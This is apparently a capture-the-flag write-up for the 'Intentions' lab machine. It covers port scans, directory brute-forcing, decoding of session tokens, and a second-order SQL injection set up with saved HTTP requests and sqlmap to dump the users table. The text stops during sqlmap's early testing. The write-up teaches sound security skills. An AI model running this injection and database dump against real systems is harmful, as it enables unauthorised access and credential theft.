# Intentions

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.148.165
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 19:01 UTC
Nmap scan report for 10.129.148.165
Host is up (0.085s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 47d20066275ee69c808903b58f9e60e5 (ECDSA)
|_  256 c8d0ac8d299b87405f1bb0a41d538ff1 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: VoIP adapter|general purpose
Running (JUST GUESSING): Cisco embedded (87%), Linux 2.6.X (87%)
OS CPE: cpe:/h:cisco:unified_call_manager cpe:/o:linux:linux_kernel:2.6.26
Aggressive OS guesses: Cisco Unified Communications Manager VoIP adapter (87%), Linux 2.6.26 (PCLinuxOS) (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   75.99 ms 10.10.16.1
2   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.13 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.148.165
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 19:03 UTC
Nmap scan report for 10.129.148.165
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 47d20066275ee69c808903b58f9e60e5 (ECDSA)
|_  256 c8d0ac8d299b87405f1bb0a41d538ff1 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Intentions
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=7/1%OT=22%CT=1%CU=31625%PV=Y%DS=2%DC=T%G=Y%TM=64A07A20
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11
OS:NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   108.62 ms 10.10.16.1
2   54.47 ms  10.129.148.165

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 414.50 seconds
```

```c
$ sudo nmap -sV -sU 10.129.148.165
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 19:14 UTC
Nmap scan report for 10.129.148.165
Host is up (0.078s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1125.92 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.148.165/

```c
$ whatweb http://10.129.148.165/
http://10.129.148.165/ [200 OK] Cookies[XSRF-TOKEN,intentions_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[intentions_session], IP[10.129.148.165], Script, Title[Intentions], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

I created an user and logged in.

| Username | Password | Email |
| --- | --- | --- |
| foobar | foobar | foobar@foobar.local |

> http://10.129.148.165/gallery#/

> http://10.129.148.165/gallery#/profile

> http://10.129.148.165/gallery#/feed

> http://10.129.148.165/gallery#/gallery

I checked my `token` which was obviously an `JWT Token`.

| Token |
| --- |
| eyJpdiI6InE4K2VLYy9oVURoYytoNjhpWnZpdUE9PSIsInZhbHVlIjoiYlRhYzlKWnNSeUxwLzRNNk5PVTFQRXQrZlZJbFJ0SVRGcUs1M1hxNXZ2cFpKazh1NGgrTFRZTStsRGV5U2dtMHVCWlkxb21MTHhGS2tTcUw3QitlZWZ3UGs4RmRSM3VGaWpzcXk4UUR1R2szemVnc0pWWGtWeHMxVzNpMG9nTzQiLCJtYWMiOiJjMzU5ZjdkNWQ4MWY1ZjA0YjY1MTYwZmZiYzVlNDE5YjFmOGMyNjE3NmQ2MTdjNTQ1OWQ4NmZhMjdkMDdhODIxIiwidGFnIjoiIn0%3D |
| eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1Mi4xMTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODgyMzgyMjQsImV4cCI6MTY4ODI1OTgyNCwibmJmIjoxNjg4MjM4MjI0LCJqdGkiOiJUYzBtRTlCYjRZdlBUMFROIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.ieNB6ilrRLuoxGz_yLcI0x3RvFqBl21B53jQmC7QFuA |

> https://jwt.io/

#### intentions_session

HEADER:ALGORITHM & TOKEN TYPE:

```c
{
  "iv": "q8+eKc/hUDhc+h68iZviuA==",
  "value": "bTac9JZsRyLp/4M6NOU1PEt+fVIlRtITFqK53Xq5vvpZJk8u4h+LTYM+lDeySgm0uBZY1omLLxFKkSqL7B+eefwPk8FdR3uFijsqy8QDuGk3zegsJVXkVxs1W3i0ogO4",
  "mac": "c359f7d5d81f5f04b65160ffbc5e419b1f8c26176d617c5459d86fa27d07a821",
  "tag": ""
}
```

PAYLOAD:DATA:

```c
{}
```

#### token

HEADER:ALGORITHM & TOKEN TYPE:

```c
{
  "typ": "JWT",
  "alg": "HS256"
}
```

PAYLOAD:DATA:

```c
{
  "iss": "http://10.129.148.165/api/v1/auth/login",
  "iat": 1688238224,
  "exp": 1688259824,
  "nbf": 1688238224,
  "jti": "Tc0mE9Bb4YvPT0TN",
  "sub": "28",
  "prv": "23bd5c8949f600adb39e701c400872db7a5976f7"
}
```

I searched for `iv value mac tag` and found information about `Laravel`.

### Directory Busting with ffuf

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://10.129.148.165/FUZZ  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.148.165/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 41ms]
    * FUZZ: css

[Status: 302, Size: 330, Words: 60, Lines: 12, Duration: 102ms]
    * FUZZ: admin

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 72ms]
    * FUZZ: js

[Status: 302, Size: 330, Words: 60, Lines: 12, Duration: 203ms]
    * FUZZ: logout

[Status: 302, Size: 330, Words: 60, Lines: 12, Duration: 135ms]
    * FUZZ: gallery

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 42ms]
    * FUZZ: fonts

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 43ms]
    * FUZZ: storage

[Status: 200, Size: 1523, Words: 415, Lines: 40, Duration: 348ms]
    * FUZZ: 

:: Progress: [26584/26584] :: Job [1/1] :: 170 req/sec :: Duration: [0:02:18] :: Errors: 2 ::
```

### File Extention Enumeration with Gobuster

```c
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://10.129.148.165/js/ -x js
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.148.165/js/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              js
[+] Timeout:                 10s
===============================================================
2023/07/06 15:39:29 Starting gobuster in directory enumeration mode
===============================================================
/admin.js             (Status: 200) [Size: 311246]
/login.js             (Status: 200) [Size: 279176]
/app.js               (Status: 200) [Size: 433792]
/gallery.js           (Status: 200) [Size: 310841]
/mdb.js               (Status: 200) [Size: 153684]
/.js                  (Status: 403) [Size: 162]
Progress: 38668 / 53170 (72.73%)[ERROR] 2023/07/06 15:43:49 [!] parse "http://10.129.148.165/js/besalu\t.js": net/url: invalid control character in URL
Progress: 41434 / 53170 (77.93%)[ERROR] 2023/07/06 15:44:08 [!] parse "http://10.129.148.165/js/error\x1f_log": net/url: invalid control character in URL
[ERROR] 2023/07/06 15:44:08 [!] parse "http://10.129.148.165/js/error\x1f_log.js": net/url: invalid control character in URL
Progress: 53168 / 53170 (100.00%)
===============================================================
2023/07/06 15:45:26 Finished
===============================================================
```

> http://10.129.148.165/js/admin.js

```c
<--- SNIP --->
Recently we've had some copyrighted images slip through onto the gallery. \n                This could turn into a big issue for us so we are putting a new process in place that all new images must go through our legal council for approval.\n                Any new images you would like to add to the gallery should be provided to legal with all relevant copyright information.\n                I've assigned Greg to setup a process for legal to transfer approved images directly to the server to avoid any confusion or mishaps.\n                This will be the only way to add images to our gallery going forward.\n            ")])])]),t._v(" "),e("div",{staticClass:"card"},[e("div",{staticClass:"card-body"},[e("h5",{staticClass:"card-title"},[t._v("v2 API Update")]),t._v(" "),e("p",{staticClass:"card-text"},[t._v("\n                Hey team, I've deployed the v2 API to production and have started using it in the admin section. \n                Let me know if you spot any bugs. \n                This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text! \n                By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.\n                This should take care of the concerns raised by our users regarding our lack of HTTPS connection.\n            ")]),t._v(" "),e("p",{staticClass:"card-text"},[t._v("\n                The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I've included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some: "),e("a",{attrs:{rel:"noopener noreferrer nofollow",href:"https://www.php.net/manual/en/class.imagick.php"}}
<--- SNIP --->
```

## API Testing

> http://10.129.148.165/api/v1/auth/user

Request:

```c
GET /api/v1/auth/user HTTP/1.1
Host: 10.129.148.165
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6IlZETkYyckV6cDVjMVdzWGlzRGlHZXc9PSIsInZhbHVlIjoiVCt0ZDZNYXY3ZjJJU3lnK2ttbjBTK2ZRUlpUcUE4MmMzMHUyWXNiNjNyM09MMUVSbGw0T1VnaUFsRFQ5emZYTGRGZ0l1WUtjT2tIbENkcFcwUWpuSVYzZ1c1TkVFZy9aN0xTSjJML3pnTlV3V1Jmczk0SytTN3pkWHdSM2docTMiLCJtYWMiOiJkNTQyZjJkMTA0OTJhMGJlYzg3MjI5ZWE3YTMwNTRkMDk2NmZjNzM0OWQ0NGNiZDk1NTk1OTYxM2RhNjE4Y2NlIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IjdrWFN1NFlHd25UdFBGek9EZkYzb1E9PSIsInZhbHVlIjoiU0FsdXBtZ2VnSGc0emhOY09DT1FiRlFHNWxBWlRmUW9DUWd0SjlJMkFmMUJSckloR1hQd3U2dTN0VFBxTmN1c0ZIUE50Q0FGb3RhWWxEQXFEK0dGRi90ZS8yYXg0Z05hK1FDZkFEMnI5Y3FHN2E4OTF0ZW9yVm41Nk1iYnM0VmgiLCJtYWMiOiI2MTNiMDdlZjA2NDkyNDE1ZGU3OTc5ZmJlMWUxMTNlMDhkNjRhZGRmZmVjNjc2MDJjNGU3MjU2NTMyZTk5Zjc1IiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1Mi4xMTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODgyMzg1MzcsImV4cCI6MTY4ODI2MDEzNywibmJmIjoxNjg4MjM4NTM3LCJqdGkiOiJEU1plV25KbWlwQVlhbTlvIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.FQJU65yywxlavuDkJLq2YEpUBUY-fTi-npkI-oEtj2o
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

Response:

```c
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: application/json
Connection: close
Cache-Control: no-cache, private
Date: Sat, 01 Jul 2023 19:25:07 GMT
X-RateLimit-Limit: 3600
X-RateLimit-Remaining: 3599
Access-Control-Allow-Origin: *
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Length: 202

{"status":"success","data":{"id":28,"name":"foobar","email":"foobar@foobar.local","created_at":"2023-07-01T19:03:41.000000Z","updated_at":"2023-07-01T19:20:40.000000Z","admin":0,"genres":"animal,food"}}
```

## Foothold

### Second Order SQL Injection

We created to requests to send over to `sqlmap`.

Request 1:

```c
POST /api/v1/gallery/user/genres HTTP/1.1
Host: 10.129.148.165
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6IlZTOFBkdTc3dG5QRVlWVUJUeFhPa3c9PSIsInZhbHVlIjoiODRKYlpTSDcwOUpLdVd3eXg4WDZVd3BFcTQ3Vk16aXZGN3NlUWNwenFNMnc1Y0Y5elBteVI0VWRvbG5jdmUyNFA4MVRwQUlXa2tzQ0t3Nm4xQnBUdUVackVlQ01waDBhalJzOTZVSFJFaDRxc0c4ajU3WXNQa0pSM2ZyUSszRlAiLCJtYWMiOiJhYTk5Yjk2NzhjNDk0OGI3NjJkZjU0MGFmN2YyZWYzYTAxYTQwMjc2ZTZhY2UxZDI3NmU1MWZhNDM4Y2MyYTZlIiwidGFnIjoiIn0=
Content-Length: 20
Origin: http://10.129.148.165
Connection: close
Referer: http://10.129.148.165/gallery
Cookie: XSRF-TOKEN=eyJpdiI6IlZTOFBkdTc3dG5QRVlWVUJUeFhPa3c9PSIsInZhbHVlIjoiODRKYlpTSDcwOUpLdVd3eXg4WDZVd3BFcTQ3Vk16aXZGN3NlUWNwenFNMnc1Y0Y5elBteVI0VWRvbG5jdmUyNFA4MVRwQUlXa2tzQ0t3Nm4xQnBUdUVackVlQ01waDBhalJzOTZVSFJFaDRxc0c4ajU3WXNQa0pSM2ZyUSszRlAiLCJtYWMiOiJhYTk5Yjk2NzhjNDk0OGI3NjJkZjU0MGFmN2YyZWYzYTAxYTQwMjc2ZTZhY2UxZDI3NmU1MWZhNDM4Y2MyYTZlIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkVTbGF4ekRxSGVoU1dNeFdTMUp1d3c9PSIsInZhbHVlIjoiS2FUdzBtc3Q4WUFnSHV0ZUZLbGtFOTJMM250QUJ1cnJndExYOHk0SUE1T21rSnZiYjU5dzBVRTN4cE9ycERmUXN6TjV2eU1WQ1BEN1p6RWp3R0wvbVF6MmpKbEdBaEtkakcra05BVElYWXJhOHdPNHFWWlJXR00rTEI1WS9jUjUiLCJtYWMiOiJlMmFkNGNiMWMwNWMyMjMxNTZjOGI5ODdlNjNkZjU3MTAwOTEwYTMzOGVmOTVkYzFhMDA3MTU0NWM1YzI1YzQyIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE0OS4xNDcvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg1NDc4MjUsImV4cCI6MTY4ODU2OTQyNSwibmJmIjoxNjg4NTQ3ODI1LCJqdGkiOiJOOEhVME1xS2p6VzlrNmNoIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.x0L1XeQB1vOw5Z2DCpqQy1VvgK6oBNmQKivH1fQmWmY

{"genres":"nature*"}
```

```c
$ cat request1.req         
POST /api/v1/gallery/user/genres HTTP/1.1
Host: 10.129.148.165
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6IlZTOFBkdTc3dG5QRVlWVUJUeFhPa3c9PSIsInZhbHVlIjoiODRKYlpTSDcwOUpLdVd3eXg4WDZVd3BFcTQ3Vk16aXZGN3NlUWNwenFNMnc1Y0Y5elBteVI0VWRvbG5jdmUyNFA4MVRwQUlXa2tzQ0t3Nm4xQnBUdUVackVlQ01waDBhalJzOTZVSFJFaDRxc0c4ajU3WXNQa0pSM2ZyUSszRlAiLCJtYWMiOiJhYTk5Yjk2NzhjNDk0OGI3NjJkZjU0MGFmN2YyZWYzYTAxYTQwMjc2ZTZhY2UxZDI3NmU1MWZhNDM4Y2MyYTZlIiwidGFnIjoiIn0=
Content-Length: 20
Origin: http://10.129.148.165
Connection: close
Referer: http://10.129.148.165/gallery
Cookie: XSRF-TOKEN=eyJpdiI6IlZTOFBkdTc3dG5QRVlWVUJUeFhPa3c9PSIsInZhbHVlIjoiODRKYlpTSDcwOUpLdVd3eXg4WDZVd3BFcTQ3Vk16aXZGN3NlUWNwenFNMnc1Y0Y5elBteVI0VWRvbG5jdmUyNFA4MVRwQUlXa2tzQ0t3Nm4xQnBUdUVackVlQ01waDBhalJzOTZVSFJFaDRxc0c4ajU3WXNQa0pSM2ZyUSszRlAiLCJtYWMiOiJhYTk5Yjk2NzhjNDk0OGI3NjJkZjU0MGFmN2YyZWYzYTAxYTQwMjc2ZTZhY2UxZDI3NmU1MWZhNDM4Y2MyYTZlIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkVTbGF4ekRxSGVoU1dNeFdTMUp1d3c9PSIsInZhbHVlIjoiS2FUdzBtc3Q4WUFnSHV0ZUZLbGtFOTJMM250QUJ1cnJndExYOHk0SUE1T21rSnZiYjU5dzBVRTN4cE9ycERmUXN6TjV2eU1WQ1BEN1p6RWp3R0wvbVF6MmpKbEdBaEtkakcra05BVElYWXJhOHdPNHFWWlJXR00rTEI1WS9jUjUiLCJtYWMiOiJlMmFkNGNiMWMwNWMyMjMxNTZjOGI5ODdlNjNkZjU3MTAwOTEwYTMzOGVmOTVkYzFhMDA3MTU0NWM1YzI1YzQyIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE0OS4xNDcvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg1NDc4MjUsImV4cCI6MTY4ODU2OTQyNSwibmJmIjoxNjg4NTQ3ODI1LCJqdGkiOiJOOEhVME1xS2p6VzlrNmNoIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.x0L1XeQB1vOw5Z2DCpqQy1VvgK6oBNmQKivH1fQmWmY

{"genres":"nature*"}
```

Then we switched over to `Feed` and saved the request as well.

Request 2:

```c
GET /api/v1/gallery/user/feed HTTP/1.1
Host: 10.129.148.165
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-XSRF-TOKEN: eyJpdiI6IlZTOFBkdTc3dG5QRVlWVUJUeFhPa3c9PSIsInZhbHVlIjoiODRKYlpTSDcwOUpLdVd3eXg4WDZVd3BFcTQ3Vk16aXZGN3NlUWNwenFNMnc1Y0Y5elBteVI0VWRvbG5jdmUyNFA4MVRwQUlXa2tzQ0t3Nm4xQnBUdUVackVlQ01waDBhalJzOTZVSFJFaDRxc0c4ajU3WXNQa0pSM2ZyUSszRlAiLCJtYWMiOiJhYTk5Yjk2NzhjNDk0OGI3NjJkZjU0MGFmN2YyZWYzYTAxYTQwMjc2ZTZhY2UxZDI3NmU1MWZhNDM4Y2MyYTZlIiwidGFnIjoiIn0=
Connection: close
Referer: http://10.129.148.165/gallery
Cookie: XSRF-TOKEN=eyJpdiI6IlZTOFBkdTc3dG5QRVlWVUJUeFhPa3c9PSIsInZhbHVlIjoiODRKYlpTSDcwOUpLdVd3eXg4WDZVd3BFcTQ3Vk16aXZGN3NlUWNwenFNMnc1Y0Y5elBteVI0VWRvbG5jdmUyNFA4MVRwQUlXa2tzQ0t3Nm4xQnBUdUVackVlQ01waDBhalJzOTZVSFJFaDRxc0c4ajU3WXNQa0pSM2ZyUSszRlAiLCJtYWMiOiJhYTk5Yjk2NzhjNDk0OGI3NjJkZjU0MGFmN2YyZWYzYTAxYTQwMjc2ZTZhY2UxZDI3NmU1MWZhNDM4Y2MyYTZlIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkVTbGF4ekRxSGVoU1dNeFdTMUp1d3c9PSIsInZhbHVlIjoiS2FUdzBtc3Q4WUFnSHV0ZUZLbGtFOTJMM250QUJ1cnJndExYOHk0SUE1T21rSnZiYjU5dzBVRTN4cE9ycERmUXN6TjV2eU1WQ1BEN1p6RWp3R0wvbVF6MmpKbEdBaEtkakcra05BVElYWXJhOHdPNHFWWlJXR00rTEI1WS9jUjUiLCJtYWMiOiJlMmFkNGNiMWMwNWMyMjMxNTZjOGI5ODdlNjNkZjU3MTAwOTEwYTMzOGVmOTVkYzFhMDA3MTU0NWM1YzI1YzQyIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE0OS4xNDcvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg1NDc4MjUsImV4cCI6MTY4ODU2OTQyNSwibmJmIjoxNjg4NTQ3ODI1LCJqdGkiOiJOOEhVME1xS2p6VzlrNmNoIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.x0L1XeQB1vOw5Z2DCpqQy1VvgK6oBNmQKivH1fQmWmY


```

```c
$ cat request2.req 
GET /api/v1/gallery/user/feed HTTP/1.1
Host: 10.129.148.165
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-XSRF-TOKEN: eyJpdiI6IlZTOFBkdTc3dG5QRVlWVUJUeFhPa3c9PSIsInZhbHVlIjoiODRKYlpTSDcwOUpLdVd3eXg4WDZVd3BFcTQ3Vk16aXZGN3NlUWNwenFNMnc1Y0Y5elBteVI0VWRvbG5jdmUyNFA4MVRwQUlXa2tzQ0t3Nm4xQnBUdUVackVlQ01waDBhalJzOTZVSFJFaDRxc0c4ajU3WXNQa0pSM2ZyUSszRlAiLCJtYWMiOiJhYTk5Yjk2NzhjNDk0OGI3NjJkZjU0MGFmN2YyZWYzYTAxYTQwMjc2ZTZhY2UxZDI3NmU1MWZhNDM4Y2MyYTZlIiwidGFnIjoiIn0=
Connection: close
Referer: http://10.129.148.165/gallery
Cookie: XSRF-TOKEN=eyJpdiI6IlZTOFBkdTc3dG5QRVlWVUJUeFhPa3c9PSIsInZhbHVlIjoiODRKYlpTSDcwOUpLdVd3eXg4WDZVd3BFcTQ3Vk16aXZGN3NlUWNwenFNMnc1Y0Y5elBteVI0VWRvbG5jdmUyNFA4MVRwQUlXa2tzQ0t3Nm4xQnBUdUVackVlQ01waDBhalJzOTZVSFJFaDRxc0c4ajU3WXNQa0pSM2ZyUSszRlAiLCJtYWMiOiJhYTk5Yjk2NzhjNDk0OGI3NjJkZjU0MGFmN2YyZWYzYTAxYTQwMjc2ZTZhY2UxZDI3NmU1MWZhNDM4Y2MyYTZlIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkVTbGF4ekRxSGVoU1dNeFdTMUp1d3c9PSIsInZhbHVlIjoiS2FUdzBtc3Q4WUFnSHV0ZUZLbGtFOTJMM250QUJ1cnJndExYOHk0SUE1T21rSnZiYjU5dzBVRTN4cE9ycERmUXN6TjV2eU1WQ1BEN1p6RWp3R0wvbVF6MmpKbEdBaEtkakcra05BVElYWXJhOHdPNHFWWlJXR00rTEI1WS9jUjUiLCJtYWMiOiJlMmFkNGNiMWMwNWMyMjMxNTZjOGI5ODdlNjNkZjU3MTAwOTEwYTMzOGVmOTVkYzFhMDA3MTU0NWM1YzI1YzQyIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE0OS4xNDcvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg1NDc4MjUsImV4cCI6MTY4ODU2OTQyNSwibmJmIjoxNjg4NTQ3ODI1LCJqdGkiOiJOOEhVME1xS2p6VzlrNmNoIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.x0L1XeQB1vOw5Z2DCpqQy1VvgK6oBNmQKivH1fQmWmY
```

The idea was to enter the payload in the `Genres` field while it was getting stored in the databases and execute it via entering the feed to call the payload.

### Dumping the Database with sqlmap

```c
$ sqlmap -r request1.req --second-req request2.req --level 5 --risk 3 --batch --tamper=space2comment -D intentions -T users --dump
        ___
       __H__                                                                                                                                                
 ___ ___["]_____ ___ ___  {1.7.6#stable}                                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                                   
|___|_  [.]_|_|_|__,|  _|                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:12:36 /2023-07-05/

[11:12:36] [INFO] parsing HTTP request from 'request1.req'
[11:12:36] [INFO] parsing second-order HTTP request from 'request2.req'
[11:12:36] [INFO] loading tamper module 'space2comment'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter 'XSRF-TOKEN' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[11:12:37] [INFO] testing connection to the target URL
[11:12:37] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:12:38] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
are you sure that you want to continue with further target testing? [Y/n] Y
[11:12:38] [INFO] testing if the target URL content is stable
[11:12:38] [INFO] target URL content is stable
[11:12:38] [INFO] testing if (custom) POST parameter 'JSON #1*' is dynamic
[11:12:38] [INFO] (custom) POST parameter 'JSON #1*' appears to be dynamic
[11:12:39] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might not be injectable
[11:12:39] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
[11:12:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
